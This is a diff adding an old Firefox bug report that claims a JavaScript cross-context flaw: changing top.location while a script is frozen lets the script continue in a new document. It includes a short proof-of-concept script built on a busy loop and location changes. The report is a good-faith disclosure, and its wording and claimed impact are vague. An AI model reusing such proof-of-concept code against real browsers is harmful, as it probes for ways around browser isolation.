@@ -1,0 +1,38 @@
+javascript cross-context
+User Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20100101 Firefox/6.0
+Build ID: 20110811165603
+
+Steps to reproduce:
+
+You can change the location of execution of a script without changing it context but eliminating the DOM top.location being replaced by a new one.
+This is done by trying to change the location with top.location and forcing the browser to freeze.
+The problem is that when you see the popup choice to decide whether to continue execution or not this change of location interprets the rest of pausing execution giving way to the possibility of continuing, but in a different body entirely new and unexpected that can be aprobechado talves by an attacker.
+
+
+Actual results:
+
+<script>
+function poc(){ /* Step 1. Execute. */
+var actual = top.location;
+top.location = "http://www.google.cl/";
+var i=0;
+for(i=0;i<=3;i++){
+i = 1; /* Step 2. Frezee but not change location */
+/* Step 3. Now, show the popup "stop script?" and change location */
+/* Step 4. Change location and press "continue script" */
+if(top.location != actual){ /* Change frame... */
+top.location = 'http://www.yahoo.cl/'; /* Change again the location? */
+/* Have access to new window but where the window DOM? */
+break; /* Liberate script */
+}
+}
+}
+</script>
+<a onclick="poc()" href="#">New instance</a>
+
+Poc: http://www.youtube.com/watch?v=Bo_xxHkQ9Bk
+
+
+Expected results:
+
+The parent script have access to new locations. Change two location off context.
